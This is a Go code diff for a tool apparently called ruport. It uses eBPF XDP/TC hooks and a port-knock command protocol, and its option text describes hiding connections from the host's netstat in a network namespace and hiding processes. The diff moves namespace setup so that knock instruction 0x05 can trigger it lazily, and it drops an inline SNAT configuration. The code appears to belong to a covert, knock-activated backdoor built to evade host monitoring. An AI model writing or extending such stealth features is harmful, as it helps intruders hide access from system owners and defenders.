@@ -6,7 +6,6 @@ package main
 
 import (
 	"bufio"
-	"encoding/binary"
 	"errors"
 	"flag"
 	"fmt"
@@ -201,26 +200,6 @@ func pollMessages(msgMap *ebpf.Map, routerMap *ebpf.Map, ctl *control.Controller
 	}
 }
 
-// ifaceIPv4 取网卡上第一个非回环 IPv4 地址（netns 模式下作为回包 SNAT 的源 IP）。
-func ifaceIPv4(ifindex int) (net.IP, error) {
-	iface, err := net.InterfaceByIndex(ifindex)
-	if err != nil {
-		return nil, err
-	}
-	addrs, err := iface.Addrs()
-	if err != nil {
-		return nil, err
-	}
-	for _, a := range addrs {
-		if ipn, ok := a.(*net.IPNet); ok {
-			if ip4 := ipn.IP.To4(); ip4 != nil && !ip4.IsLoopback() {
-				return ip4, nil
-			}
-		}
-	}
-	return nil, fmt.Errorf("no IPv4 address on interface index %d", ifindex)
-}
-
 func main() {
 	var (
 		ifaceName string
@@ -239,7 +218,7 @@ func main() {
 	flag.IntVar(&srvPort, "p", 0, "服务端口(兼容保留，不参与逻辑)")
 	flag.BoolVar(&bHidden, "H", false, "隐藏进程(原版 pidhide 已禁用，此参数仅为兼容保留)")
 
-	flag.BoolVar(&netnsMode, "N", false, "启用 netns 隐藏模式（宿主 netstat 不显示隐藏连接）")
+	flag.BoolVar(&netnsMode, "N", false, "netns 预热：启动即建立命名空间（不指定时由敲门指令 05 懒初始化）")
 	flag.StringVar(&nsName, "ns-name", "ruport_ns", "netns 隐藏模式：命名空间名称")
 	flag.StringVar(&nsSubnet, "ns-subnet", "10.0.0.0/24", "netns 隐藏模式：内网段（.1 网关 / .2 服务）")
 	flag.StringVar(&execCmd, "exec", "", "netns 隐藏模式：在命名空间内拉起的服务命令（空格切分，不走 shell）")
@@ -290,22 +269,22 @@ func main() {
 		log.Fatalf("remove memlock: %v", err)
 	}
 
-	// netns 隐藏模式：命名空间/veth/路由/卸载设置就绪（幂等）
+	// netns 预热（可选）：-N 时启动即建 ns 并可预拉服务；
+	// 不指定时由敲门指令 ins=0x05 懒初始化（internal/control）
+	_, nsSub, err := net.ParseCIDR(nsSubnet)
+	if err != nil {
+		log.Fatalf("invalid -ns-subnet %q: %v", nsSubnet, err)
+	}
 	var nsInfo *netnsx.NS
 	var serviceCmd *exec.Cmd
 	if netnsMode {
-		_, subnet, err := net.ParseCIDR(nsSubnet)
-		if err != nil {
-			log.Fatalf("invalid -ns-subnet %q: %v", nsSubnet, err)
-		}
-		nsInfo, err = netnsx.Ensure(nsName, subnet)
+		nsInfo, err = netnsx.Ensure(nsName, nsSub)
 		if err != nil {
 			log.Fatalf("ensure netns: %v", err)
 		}
 		defer nsInfo.Close()
-		log.Printf("netns ready: %s, %s=%s(%s), %s=%s(%s)",
-			nsName, nsInfo.HostVeth, nsInfo.GatewayIP, "gw",
-			nsInfo.NsVeth, nsInfo.ServiceIP, "service")
+		log.Printf("netns ready: %s, %s=%s(gw), %s=%s(service)",
+			nsName, nsInfo.HostVeth, nsInfo.GatewayIP, nsInfo.NsVeth, nsInfo.ServiceIP)
 		// FORWARD 链为 DROP 的宿主会丢弃转发进 ns 的包（只提示，不自动改防火墙）
 		log.Print("hint: 若宿主 iptables/nftables FORWARD 链为 DROP，需自行放行 veth 转发")
 
@@ -350,26 +329,13 @@ func main() {
 		log.Fatalf("load tc error: %v", err)
 	}
 
-	// netns 模式：注入 config_map（nativeip/hostip 为网络序原始位型，
-	// 与 BPF 侧 __be32 的内存语义一致）。未注入即传统端口改写模式。
-	if netnsMode {
-		hostIP, err := ifaceIPv4(ifindex)
-		if err != nil {
-			log.Fatalf("resolve host ip: %v", err)
-		}
-		cfg := bpf.TcConfig{
-			Nativeip: binary.BigEndian.Uint32(nsInfo.ServiceIP.To4()),
-			Hostip:   binary.BigEndian.Uint32(hostIP.To4()),
-		}
-		if err := tcObjs.ConfigMap.Put(uint32(0), &cfg); err != nil {
-			log.Fatalf("write config_map: %v", err)
-		}
-		log.Printf("netns mode active: DNAT dst -> %s, SNAT replies back to %s",
-			nsInfo.ServiceIP, hostIP)
-	}
-
 	// create a accept thread（伺服 goroutine）
-	ctl := control.New()
+	ctl := control.New(control.Config{
+		Ifindex:      ifindex,
+		NetnsName:    nsName,
+		NetnsSubnet:  nsSub,
+		NetnsPrewarm: nsInfo,
+	})
 	go waitWeakupWorker(xdpObjs.MessageMap, tcObjs.RouterMap, ctl)
 
 	// 注册处理信号：SIGINT/SIGSEGV 时 releaseall 后退出（等价原 stop()）
@@ -377,10 +343,12 @@ func main() {
 	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGSEGV)
 	<-sigCh
 
-	// 服务生命周期默认绑定 ruport（--exec-detach 可分离）
+	// 服务生命周期默认绑定 ruport（--exec-detach 可分离）；
+	// 敲门指令拉起的服务同理，统一回收
 	if serviceCmd != nil && serviceCmd.Process != nil && !execDetach {
 		_ = serviceCmd.Process.Signal(syscall.SIGTERM)
 	}
+	ctl.Shutdown()
 
 	tcAt.release()
 	xdpLink.Close()
